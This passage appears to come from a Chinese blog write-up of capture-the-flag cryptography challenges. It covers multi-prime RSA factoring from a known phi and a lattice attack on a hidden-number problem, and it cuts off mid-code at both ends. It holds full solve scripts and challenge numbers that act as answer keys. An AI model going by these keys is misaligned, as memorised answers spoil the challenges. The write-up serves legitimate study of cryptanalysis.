class="number">2</span> * x**<span class="number">195</span></span><br><span class="line">        + <span class="number">3</span> * x**<span class="number">194</span> + <span class="number">3</span> * x**<span class="number">193</span> - x**<span class="number">192</span> + <span class="number">4</span> * x**<span class="number">191</span> + <span class="number">2</span> * x**<span class="number">189</span> + x**<span class="number">186</span></span><br><span class="line">        - x**<span class="number">185</span> - x**<span class="number">184</span> + <span class="number">3</span> * x**<span class="number">183</span> + x**<span class="number">182</span> + <span class="number">2</span> * x**<span class="number">181</span> - <span class="number">2</span> * x**<span class="number">180</span></span><br><span class="line">        + x**<span class="number">177</span> + x**<span class="number">175</span> - x**<span class="number">173</span> + <span class="number">3</span> * x**<span class="number">172</span> + x**<span class="number">170</span> + x**<span class="number">169</span> - x**<span class="number">167</span></span><br><span class="line">        - <span class="number">2</span> * x**<span class="number">166</span> - x**<span class="number">165</span> - <span class="number">4</span> * x**<span class="number">164</span> - <span class="number">2</span> * x**<span class="number">163</span> + <span class="number">2</span> * x**<span class="number">162</span> + <span class="number">4</span> * x**<span class="number">161</span></span><br><span class="line">        - <span class="number">2</span> * x**<span class="number">160</span> - <span class="number">3</span> * x**<span class="number">159</span> - <span class="number">2</span> * x**<span class="number">158</span> - <span class="number">2</span> * x**<span class="number">157</span> + x**<span class="number">156</span> - x**<span class="number">155</span></span><br><span class="line">        + <span class="number">3</span> * x**<span class="number">154</span> - <span class="number">4</span> * x**<span class="number">153</span> + x**<span class="number">151</span> + <span class="number">2</span> * x**<span class="number">150</span> + x**<span class="number">149</span> - x**<span class="number">148</span></span><br><span class="line">        + <span class="number">2</span> * x**<span class="number">147</span> + <span class="number">3</span> * x**<span class="number">146</span> + <span class="number">2</span> * x**<span class="number">145</span> - <span class="number">4</span> * x**<span class="number">144</span> - <span class="number">4</span> * x**<span class="number">143</span> + x**<span class="number">142</span></span><br><span class="line">        - <span class="number">2</span> * x**<span class="number">140</span> - <span class="number">2</span> * x**<span class="number">139</span> + <span class="number">2</span> * x**<span class="number">138</span> + <span class="number">3</span> * x**<span class="number">137</span> + <span class="number">3</span> * x**<span class="number">136</span> + <span class="number">3</span> * x**<span class="number">135</span></span><br><span class="line">        + x**<span class="number">134</span> - x**<span class="number">133</span> + <span class="number">2</span> * x**<span class="number">132</span> + <span class="number">3</span> * x**<span class="number">130</span> - <span class="number">3</span> * x**<span class="number">129</span> - <span class="number">2</span> * x**<span class="number">128</span></span><br><span class="line">        - x**<span class="number">127</span> - <span class="number">2</span> * x**<span class="number">126</span> + x**<span class="number">125</span> + x**<span class="number">124</span> - <span class="number">2</span> * x**<span class="number">123</span> + x**<span class="number">122</span> - x**<span class="number">121</span></span><br><span class="line">        + <span class="number">3</span> * x**<span class="number">120</span> - x**<span class="number">119</span> - <span class="number">2</span> * x**<span class="number">118</span> - x**<span class="number">117</span> - x**<span class="number">116</span> - <span class="number">2</span> * x**<span class="number">115</span> + <span class="number">2</span> * x**<span class="number">114</span></span><br><span class="line">        + <span class="number">2</span> * x**<span class="number">113</span> - <span class="number">3</span> * x**<span class="number">112</span> - x**<span class="number">111</span> - <span class="number">4</span> * x**<span class="number">110</span> + x**<span class="number">109</span> + x**<span class="number">108</span> + x**<span class="number">106</span></span><br><span class="line">        - <span class="number">4</span> * x**<span class="number">105</span> + x**<span class="number">104</span> - x**<span class="number">103</span> - x**<span class="number">101</span> + x**<span class="number">100</span> - <span class="number">2</span> * x**<span class="number">99</span> + x**<span class="number">98</span></span><br><span class="line">        - x**<span class="number">97</span> + <span class="number">3</span> * x**<span class="number">96</span> + <span class="number">3</span> * x**<span class="number">94</span> - x**<span class="number">93</span> - x**<span class="number">92</span> + x**<span class="number">91</span> - <span class="number">2</span> * x**<span class="number">90</span></span><br><span class="line">        + x**<span class="number">89</span> - x**<span class="number">88</span> + x**<span class="number">87</span> - x**<span class="number">86</span> + x**<span class="number">85</span> + x**<span class="number">84</span> - x**<span class="number">83</span> + x**<span class="number">79</span></span><br><span class="line">        - <span class="number">3</span> * x**<span class="number">78</span> - <span class="number">2</span> * x**<span class="number">77</span> + x**<span class="number">74</span> + <span class="number">3</span> * x**<span class="number">73</span> - x**<span class="number">72</span> - <span class="number">3</span> * x**<span class="number">71</span></span><br><span class="line">        - <span class="number">2</span> * x**<span class="number">70</span> + x**<span class="number">69</span> - <span class="number">3</span> * x**<span class="number">66</span> + x**<span class="number">65</span> + x**<span class="number">64</span> - <span class="number">4</span> * x**<span class="number">62</span> - x**<span class="number">61</span></span><br><span class="line">        + x**<span class="number">60</span> - x**<span class="number">59</span> + <span class="number">3</span> * x**<span class="number">58</span> - x**<span class="number">57</span> - x**<span class="number">54</span> + <span class="number">3</span> * x**<span class="number">53</span> + x**<span class="number">51</span></span><br><span class="line">        - <span class="number">3</span> * x**<span class="number">50</span> - x**<span class="number">49</span> + <span class="number">2</span> * x**<span class="number">47</span> - x**<span class="number">46</span> - x**<span class="number">44</span> + x**<span class="number">43</span> - x**<span class="number">42</span></span><br><span class="line">        - <span class="number">4</span> * x**<span class="number">41</span> - <span class="number">3</span> * x**<span class="number">39</span> - x**<span class="number">37</span> - x**<span class="number">36</span> - <span class="number">3</span> * x**<span class="number">35</span> + x**<span class="number">34</span> + x**<span class="number">33</span></span><br><span class="line">        - <span class="number">2</span> * x**<span class="number">32</span> + <span class="number">2</span> * x**<span class="number">31</span> - x**<span class="number">30</span> + <span class="number">2</span> * x**<span class="number">29</span> - <span class="number">2</span> * x**<span class="number">28</span> - <span class="number">2</span> * x**<span class="number">27</span></span><br><span class="line">        - x**<span class="number">24</span> + x**<span class="number">22</span> - <span class="number">5</span> * x**<span class="number">21</span> + <span class="number">3</span> * x**<span class="number">20</span> + <span class="number">2</span> * x**<span class="number">19</span> - x**<span class="number">18</span> + <span class="number">2</span> * x**<span class="number">17</span></span><br><span class="line">        + x**<span class="number">16</span> - <span class="number">2</span> * x**<span class="number">15</span> - <span class="number">2</span> * x**<span class="number">14</span> + x**<span class="number">13</span> + x**<span class="number">12</span> + <span class="number">2</span> * x**<span class="number">11</span> - <span class="number">3</span> * x**<span class="number">10</span></span><br><span class="line">        + <span class="number">3</span> * x**<span class="number">9</span> + <span class="number">2</span> * x**<span class="number">8</span> - <span class="number">4</span> * x**<span class="number">6</span> - <span class="number">2</span> * x**<span class="number">5</span> - <span class="number">4</span> * x**<span class="number">4</span> + x**<span class="number">3</span></span><br><span class="line">        - x**<span class="number">2</span> - <span class="number">1</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 f(1)</span></span><br><span class="line">result = f(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;f(1) = <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">k=result</span><br><span class="line">w = <span class="number">32824596080441735190523997982799829197530203904568086251690542244969244071312854874746142497647579310192994177896837383837384405062036521829088599595750902976191010000575697075792720479387771945760107268598283406893094243282498381006464103080551366587157561686900620059394693185990788592220509670478190685244</span></span><br><span class="line">n = <span class="number">101780569941880865465631942473186578520071435753163950944409148606282910806650879176280021512435190682009749926285674412651435782567149633130455645157688819845748439487113261739503325065997835517112163014056297017874761742768297646567397770742374004940360061700285170103292360590891188591132054903101398360047</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">77538275949900942020886849496162539665323546686749270705418870515132296087721218282974435210763225488530925782158331269160555819622551413648073293857866671421886753377970220838141826468831099375757481041897142546760492813343115244448184595644585857978116766199800311200819967057790401213156560742779242511746</span></span><br><span class="line">d = (<span class="built_in">pow</span>(<span class="number">2</span>, k,n) - w)%n</span><br><span class="line">p = gcd(d, n)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line">q=n//p</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=inverse(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>

<h1 id="baby-factor-revenge"><a href="#baby-factor-revenge" class="headerlink" title="baby_factor_revenge"></a>baby_factor_revenge</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>():</span><br><span class="line">    pl  = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        pl.append(getPrime(<span class="number">1024</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sorted</span>(pl)</span><br><span class="line">pl = create()</span><br><span class="line">m=<span class="string">b&#x27;NSSCTF&#123;xxxxxx&#125;&#x27;</span></span><br><span class="line">p,q,r = pl[<span class="number">0</span>],pl[<span class="number">1</span>],pl[<span class="number">2</span>]</span><br><span class="line">n = p*q*r</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">phi_2=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">n2=p*q</span><br><span class="line">c=<span class="built_in">pow</span>(bytes_to_long(m),e,n2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n=<span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;phi=<span class="subst">&#123;phi&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c=<span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n=3191868707489083296976422171754481125088448532695639929013026951283334085716937496519972309690132954050242378974370025245594553866043111294840209514577676946872746793700126873931085112786381515154186105142460622301297252278473097650013016482539838576476763183025029834004241446095147665598581368214114851984460699747964946764645986828307675081596907634022110868102739948513844625534865764252668312850364286204872187001344218083941399088833989233474318289529103178632284291007694811574023047207470113594082533713524606268388742119103653587354956091145288566437795469230667897089543048576812362251576281067933183713438502813206542834734983616378764909202774603304124497453696792428111112644362307853143219890039129054302905340695668256116233515323529918746264727874817221051242387145263342018617858562987223211598238069486447049955021864781104312134816578626968386395835285074116149472750100154961405785440009296096563521430833</span></span><br><span class="line"><span class="string">phi=3191868707489083296976422171754481125088448532695639929013026951283334085716937496519972309690132954050242378974370025245594553866043111294840209514577676946872746793700126873931085112786381515154186105142460622301297252278473097650013016482539838576476763183025029834004241446095147665598581368214114851984394758254181484105857103844940487787404078873566779953101987404891507588290232992132681729619718279684673827347612899406697514777723904351697638562060304399923174376216080338949397741477013367831377040866937433520175862575061413321076151761545984886547872427147498175814451096795344136954743868643889768901204954902708679102384061694877757565486240670882343628571424084461972849147495569088820011108794930593172573959423278140327579049114196086428504291102619820322231225943837444001821535593671764186251713714593498207219093585758479440828038119079608764008747539277397742897542501803218788455452391287578171880267200</span></span><br><span class="line"><span class="string">c=8847973599594272436100870059187158819529199340583461915617467299706215012295598155778224026186157290320191983062022702191439286020733625396165573681688842631368993650799220713225485752608650482408353598320160571916055498330875851476520668973214124194890108144336715482373743731578734960096351460142579903010557821654345995923836938260379746304222820835040419844947019844885128550552066290798665884099701340641403329066058638137944934073185448687990744852400616823426082588916251127609191094346267837812018236673478691437630461425526779014305216914035039981685211625653600564431704400207095883904994772993227506462664</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>一开始以为要根据phi和phi_2的关系分解n之类的，后来发现自己想多了，直接已知phi和n分解n就行，也有现成的板子，也有具体的论文<a href="https://link.springer.com/content/pdf/10.1007/3-540-36492-7_25.pdf">link.springer.com&#x2F;content&#x2F;pdf&#x2F;10.1007&#x2F;3-540-36492-7_25.pdf</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> isqrt</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">factorize_multi_prime</span>(<span class="params">N, phi</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Recovers the prime factors from a modulus if Euler&#x27;s totient is known.</span></span><br><span class="line"><span class="string">    This method works for a modulus consisting of any number of primes, but is considerably be slower than factorize.</span></span><br><span class="line"><span class="string">    More information: Hinek M. J., Low M. K., Teske E., &quot;On Some Attacks on Multi-prime RSA&quot; (Section 3)</span></span><br><span class="line"><span class="string">    :param N: the modulus</span></span><br><span class="line"><span class="string">    :param phi: Euler&#x27;s totient, the order of the multiplicative group modulo N</span></span><br><span class="line"><span class="string">    :return: a tuple containing the prime factors</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    prime_factors = <span class="built_in">set</span>()</span><br><span class="line">    factors = [N]</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(factors) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># Element to factorize.</span></span><br><span class="line">        N = factors[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        w = randrange(<span class="number">2</span>, N - <span class="number">1</span>)</span><br><span class="line">        i = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> phi % (<span class="number">2</span> ** i) == <span class="number">0</span>:</span><br><span class="line">            sqrt_1 = <span class="built_in">pow</span>(w, phi // (<span class="number">2</span> ** i), N)</span><br><span class="line">            <span class="keyword">if</span> sqrt_1 &gt; <span class="number">1</span> <span class="keyword">and</span> sqrt_1 != N - <span class="number">1</span>:</span><br><span class="line">                <span class="comment"># We can remove the element to factorize now, because we have a factorization.</span></span><br><span class="line">                factors = factors[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">                p = gcd(N, sqrt_1 + <span class="number">1</span>)</span><br><span class="line">                q = N // p</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> isprime(p):</span><br><span class="line">                    prime_factors.add(p)</span><br><span class="line">                <span class="keyword">elif</span> p &gt; <span class="number">1</span>:</span><br><span class="line">                    factors.append(p)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> isprime(q):</span><br><span class="line">                    prime_factors.add(q)</span><br><span class="line">                <span class="keyword">elif</span> q &gt; <span class="number">1</span>:</span><br><span class="line">                    factors.append(q)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># Continue in the outer loop</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">tuple</span>(prime_factors)</span><br><span class="line">n=<span class="number">3191868707489083296976422171754481125088448532695639929013026951283334085716937496519972309690132954050242378974370025245594553866043111294840209514577676946872746793700126873931085112786381515154186105142460622301297252278473097650013016482539838576476763183025029834004241446095147665598581368214114851984460699747964946764645986828307675081596907634022110868102739948513844625534865764252668312850364286204872187001344218083941399088833989233474318289529103178632284291007694811574023047207470113594082533713524606268388742119103653587354956091145288566437795469230667897089543048576812362251576281067933183713438502813206542834734983616378764909202774603304124497453696792428111112644362307853143219890039129054302905340695668256116233515323529918746264727874817221051242387145263342018617858562987223211598238069486447049955021864781104312134816578626968386395835285074116149472750100154961405785440009296096563521430833</span></span><br><span class="line">phi=<span class="number">3191868707489083296976422171754481125088448532695639929013026951283334085716937496519972309690132954050242378974370025245594553866043111294840209514577676946872746793700126873931085112786381515154186105142460622301297252278473097650013016482539838576476763183025029834004241446095147665598581368214114851984394758254181484105857103844940487787404078873566779953101987404891507588290232992132681729619718279684673827347612899406697514777723904351697638562060304399923174376216080338949397741477013367831377040866937433520175862575061413321076151761545984886547872427147498175814451096795344136954743868643889768901204954902708679102384061694877757565486240670882343628571424084461972849147495569088820011108794930593172573959423278140327579049114196086428504291102619820322231225943837444001821535593671764186251713714593498207219093585758479440828038119079608764008747539277397742897542501803218788455452391287578171880267200</span></span><br><span class="line"><span class="built_in">print</span>(factorize_multi_prime(n, phi))</span><br><span class="line">p=<span class="number">177161320761695019215027450645114399072824136106796362891135280161503389503472113661790284346462113619617781651103105272149164401936630771895089936212673886987337552041566541830687513838748962966300768220005116250783079381135938459491010257996349274618491301060545101347741119007695583141027530048807773438431</span></span><br><span class="line">q=<span class="number">118589237846929157177145636173700007714734296636618078863121028787719233856255349991676793277685489964300857832756581934799294586957137083742162225794737817065789645999587706703620635609191140301627049542092790079764008202073952667787393392675044942337058473033104592846222792727822005560480411401441075365471</span></span><br><span class="line">r=<span class="number">151925555068309740027629873616844956416777676942104988548600500604734980705751500202455811525437316981852933269865712140204105818819734994452674160925578679385681053244060180042799265901275164392807664922780095166647350519792074240010137576702747299629682862274167454415537848662371715182873269954851056702833</span></span><br><span class="line">phi_2=(q-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line">n2=q*r</span><br><span class="line">d=inverse(e,phi_2)</span><br><span class="line">c=<span class="number">8847973599594272436100870059187158819529199340583461915617467299706215012295598155778224026186157290320191983062022702191439286020733625396165573681688842631368993650799220713225485752608650482408353598320160571916055498330875851476520668973214124194890108144336715482373743731578734960096351460142579903010557821654345995923836938260379746304222820835040419844947019844885128550552066290798665884099701340641403329066058638137944934073185448687990744852400616823426082588916251127609191094346267837812018236673478691437630461425526779014305216914035039981685211625653600564431704400207095883904994772993227506462664</span></span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n2)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>

<h1 id="baby-lattice"><a href="#baby-lattice" class="headerlink" title="baby_lattice"></a>baby_lattice</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">miku = <span class="number">30</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">key = getPrime(<span class="number">512</span>)</span><br><span class="line"><span class="keyword">while</span> key&gt; p:</span><br><span class="line">    key= getPrime(<span class="number">512</span>)</span><br><span class="line">ts = []</span><br><span class="line">gs = []</span><br><span class="line">zs = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(miku):</span><br><span class="line">    t = getPrime(<span class="number">512</span>)</span><br><span class="line">    z = getPrime(<span class="number">400</span>)</span><br><span class="line">    g= (t * key + z) % p</span><br><span class="line">    ts.append(t)</span><br><span class="line">    gs.append(g)</span><br><span class="line">    zs.append(z)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;ts = <span class="subst">&#123;ts&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;gs = <span class="subst">&#123;gs&#125;</span>&#x27;</span>)</span><br><span class="line">iv= os.urandom(<span class="number">16</span>)</span><br><span class="line">cipher = AES.new(<span class="built_in">str</span>(key).encode()[:<span class="number">16</span>], AES.MODE_CBC,iv)</span><br><span class="line">ciphertext=cipher.encrypt(pad(flag.encode(),<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;iv=<span class="subst">&#123;iv&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;ciphertext=<span class="subst">&#123;ciphertext&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>从题目代码不难看出是一个LHNP问题。</p>
<p><img src="https://ooo.0x0.ooo/2025/03/09/OQX2DC.png" alt="OQX2DC.png"></p>
<p>我们可以据此构造矩阵M。<br>$$<br>\left[<br>\begin{matrix}<br> p      &amp;       &amp;      &amp;    &amp;   &amp;   \<br>       &amp; p      &amp;  &amp;       \<br>       &amp;       &amp;\ddots      &amp;    &amp;   &amp; \<br>         &amp;       &amp;      &amp; p   &amp;   &amp; \<br> -r_1 &amp; -r_2 &amp;\cdots  &amp;-r_n &amp; k&#x2F;p \<br> c_1      &amp; c_2 &amp; \cdots &amp; c_n&amp; &amp;k      \<br>\end{matrix}<br>\right]<br>$$<br>满足以下等式</p>
<p>（k$_1$,k$_2$,……k$_t$,x,1)M&#x3D;(e$_1$,e$_2$,…..e$_t$,kx&#x2F;p,k),LLL求解即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">t=<span class="number">30</span></span><br><span class="line">p = <span class="number">13401991645840298882794100147034379521242237285821020793208518466205688272722127694554243298223159648613332253774886696888511245155898681828972316158766813</span></span><br><span class="line">ts = [<span class="number">8016983781273189754281912962247057409930227455812224730112055674262101679986538896353333785641031178561641562965339977035588567181180100475283408488320671</span>, <span class="number">12980173980684618239567238092970002844391225790428809984588444288874980047043175328056782109973890659670718383856150425014293022930574469326618263083648099</span>, <span class="number">8109856702010014482292978050018141635784057812487351143916154508689142112615449144377702002382005662470835964315028619291602564624893518861557701327890923</span>, <span class="number">12785373226115694299429762427866573289359143336748874789256870948157808484043436344897926547699412946084053665605873366419653263394817308889578649556482317</span>, <span class="number">12293720016807713691819354075258380849321736691923473670291035750221768289875347194928451102365603432383881559318603460687890903510706219895796459019974867</span>, <span class="number">9784378896444105030039569921777285228994264456281120536753266782980679466146906618674672118057906497814953677764528302638725540882074537262487534252076829</span>, <span class="number">9241433814815706758885649801540944918822400007457713603674159882791199750057709773097552334465041959969676782253637817171507122904345522225398825682237481</span>, <span class="number">11204803848333722110323297716136514262820561394355433234423667799557561253910421337700868735544193790444406938869863716247161888020220901893711513603634809</span>, <span class="number">10851090251796215969502640347727949807230163009657915435491546953253351810608099195268759626721620529756828379004467476267712531905975334082089231769707617</span>, <span class="number">11250957460128461102060212243723539805901629603092001540925013383541943835129096257407578679799378517176957440298695788786794500447140718667332595080944869</span>, <span class="number">12248623923069220370917375593286718711586079377902376988707257328512455851210970182518826733646869485671374318338949112466814956514662420760908691130244383</span>, <span class="number">11061068271412202445428992286301637014530049371871820612053163253748795430394720967354122057185625710764847486790478210908967065668096047462000900877243843</span>, <span class="number">9250800791153158078642768324800520716511537203538708124830844957330029236789799844775267058446261708862442981956837389747149720449997356553753692631237873</span>, <span class="number">11442112467994330302413453979716258058149104607244851803491048585747359474970005873336772224480265499136742622823880716879860377641238675210553131052206691</span>, <span class="number">8851268226889934481971979527547782930762103134830344221114784617526682434893736517219781937490279514229768881864475696389373739501629994242420024622585309</span>, <span class="number">8761826274329402585517262093482651333161640060627583337505498299736119877176278155436111156185319629046980645810012652601825582701466570339570478108791887</span>, <span class="number">8173260008522260126563915135008278248111293487661172115633899079869720932758788675224579864948752039769531398938248083971071345978173279466336354696742377</span>, <span class="number">11733325877716881936637372036969125985631514189799569847189115606745019694984456424617859168884541552882900918661071180298079869943357668081866511603361429</span>, <span class="number">12798678249651545625305346509566263707129030745621625744465668772298872710674031103310015594375483838020916596533864897632924958154707810583510669376046159</span>, <span class="number">11972367565183102195894957634073708898746516169055154830786380821612631063771935949099855541345280195465211676841845799521135332692746439801114025346776451</span>, <span class="number">8309485355838062558333744941897142201736283502970173073711189070760311131678107029730686549988329677109870570827466668034034377094834508445549924223585219</span>, <span class="number">10037957030668927878463105058548635761147918169468443696251870837018029994579358415317101911755591591785037623566701920710453008930531891302329922308475079</span>, <span class="number">13221078857886779075714191159549244640144219704164657103905516889650093241197471185563906205007376146027157620524696025494715411571586859030421582641250071</span>, <span class="number">13377141034964464295846379646837504968557246139611266461228568513844912255762222441387410898249170108735540582627742796017922462329606088337301365183628591</span>, <span class="number">11503417590216916228951909788782481610038959664264972733435373475346403291387209063270057139621628854733942831548624992555175497319058962145185736395531609</span>, <span class="number">10682562966818807073688884352394574841623385668134186058213080078637580526582062737913378756835873195913042020318042792997704842570481165538229628253983417</span>, <span class="number">7009494733984067792833862756223517770477471938386639921019003601598472840183655333614008677846799784155444425042016748876974547683111073376705004070094301</span>, <span class="number">9396274922380984183217450286560296708001013262936289587249206096013034374236192395477584831821730898646879768741299571262843654547918064041618890696711333</span>, <span class="number">9055143657462834722016836241561857041386247088507191351272758917384350750091500866289528933248085632291073921554368989805281660196853938630560350667255913</span>, <span class="number">7075881589550115729079726581415060529537262743216265811601339312252250745864621882784185460812341989475906020671174894015501378625757286896275136526488817</span>]</span><br><span class="line">gs = [<span class="number">3547025130757031371763547817278671805806523773597386380426228204353325314755125874825372064344551510783942287325061869515563511720377069479838665918916338</span>, <span class="number">561524185998066303459395863084068415723518371857539287162474295289737845979144864495515229777991463363132381517905379393086271602757286846999926034367409</span>, <span class="number">10630918988200018501478600883655233518093875635494077893436132190015060760951001030031068630865667129447250982542911493607849695255758299063471724885107320</span>, <span class="number">5385738167688714294394456876987750423263279740302210790063861475593679005286633965917637168163655774852001750955925563171806165861440634515967640179944804</span>, <span class="number">3686451063569312252337028014973428925521749963152262622523483348285262144703447272544972123815729823760936936761643322992469583780002855185407873398768127</span>, <span class="number">9596580956215126253893458055745193704575088913515678341231900675542245449333964660007025564677263334281046226112471415925784249910282102204627251580303047</span>, <span class="number">9656829597739031272294632966205884640125918053307645634673206826103547310810254891833432384622548154588598670746803614688469837172848481449498079690935715</span>, <span class="number">9907308304392368929600091658386459655450451232070442677496713774343506026327224070703486188335961098033888098971263207077722473044862118000082007110037557</span>, <span class="number">7839372385123283975949639433665292734490760458360682832497005213559939527031767909811695257768341209806346811519315554587887588294359891829457980910373676</span>, <span class="number">9524560447616291402016995361580593070951296833074538783490159546001656765257005901587161833656370873513309819850104060230660386406669378214335512722509152</span>, <span class="number">8734422874517209772760818316188000967216535009508164549745674472106165337990045713973843427581730460676070294620298664038968581128044873585552989614725336</span>, <span class="number">5148158222052082942951739997892280954937954769195857112271289335776175568625514426629773392655353554820374445881301175856523121361252868192790918069469104</span>, <span class="number">3405639365216597742633558534342314393231966921971024333387009357007031255109911181571542920889177048552084631482291912851876735480121959418518626599223928</span>, <span class="number">6965895908963098896413697893751255263053889382630643791713636829201586125658579731479485123904224727756791164618191156426250811133029277086293720268527300</span>, <span class="number">515472047175628755463279789359658211455570096067652817360508027869002916852457796014115363850477155232728049656195126940493402028508630979737222916876246</span>, <span class="number">8377848726362282033165443045774756072489017398005262818165334796393061408947900148462399707261050565348807577258621241416711089587307194346694505937252864</span>, <span class="number">1178755053483981880338850194698011124968424379914871101461970724324613752209283539401502897388962321646518511682063263530792638817282211333222820982688221</span>, <span class="number">6409725586399153562174435158247599193499008381130383743433623949976530392240171542527657077771723107664747118903213393154893390715457247849808357209465942</span>, <span class="number">3372824803484968486680937546271819996332625362891283809637871759604598252172343794474197823370030403360262989580844260103083478034905726890611202238641340</span>, <span class="number">13221067729455004299677399984872603663881675510140157358091630484387026309376774076498558628883879446483977202290444900329681753187886973457338777404374837</span>, <span class="number">7168388056726802823482632673894477305062116631923141017136239676696007696629606782541016490173953868270727600022309320772114799519383514048456314407549126</span>, <span class="number">5250230933448962245502125593869313477032913928941516938273943408457441209365441112912617832856547549404891414953525445963675011329667621804152746371657313</span>, <span class="number">8511291855606246692070730459514263912089592580342504124890734122750181111943376656479213361961009582891618556261302703133404839204999651359329176948170842</span>, <span class="number">10576966024912004586600985705328475294820172279541596349092328002861342696932964481093301707680584309062968518297314914578723605267596141569538103299931592</span>, <span class="number">12610576251820483830699440118009518195547953924641848179631259695652398482759919292823264035055444639679877606276670927735340951916197191958922906156370663</span>, <span class="number">3742260845065949575192054445757226288737527960324254459850715703182879384214273141678432129201712761002566924178045796602250837169613100836509080462118064</span>, <span class="number">11563799338655584285772430060426469486983276581413105960901201146319641194721216394735314795999096052047566733050321685673448559752053334666493545565267458</span>, <span class="number">2135904971793751083168704063674429207856744601756475004904460101727999030934815461118290836502605293753384609825541213034656253854812143724421464450937515</span>, <span class="number">3115138049292154301818359336614981367419382594686950083225042221335435796679806070685800479754927915293066789893346628151325862299622031407323031470432866</span>, <span class="number">11834987428374239733081967249175125232293539826462896997963240557834259212701171232384194311849363016441847536816726226234955703291712817155658535826680986</span>]</span><br><span class="line"><span class="comment"># Calculate A &amp; B</span></span><br><span class="line">p = p</span><br><span class="line">rs = ts</span><br><span class="line">cs = gs</span><br><span class="line">t = <span class="number">30</span></span><br><span class="line">kbits = <span class="number">400</span></span><br><span class="line">K = <span class="number">2</span> ** kbits</span><br><span class="line">iv=<span class="string">b&#x27;\x88\x0c\x7f\x92\xd7\xb7\xaf4\xe4\xfb\xd1_\xab\xff)\xb8&#x27;</span></span><br><span class="line">ciphertext=<span class="string">b&#x27;\x94\x198\xd6\xa2mK\x00\x06\x7f\xad\xa0M\xf7\xadV;EO$\xee\xcdB0)\xfb!&amp;8%,M&#x27;</span></span><br><span class="line">P = identity_matrix(t) * p</span><br><span class="line"><span class="built_in">print</span>(P)</span><br><span class="line">RC = matrix([[-<span class="number">1</span>, <span class="number">0</span>], [<span class="number">0</span>, <span class="number">1</span>]]) * matrix([rs, cs])</span><br><span class="line"><span 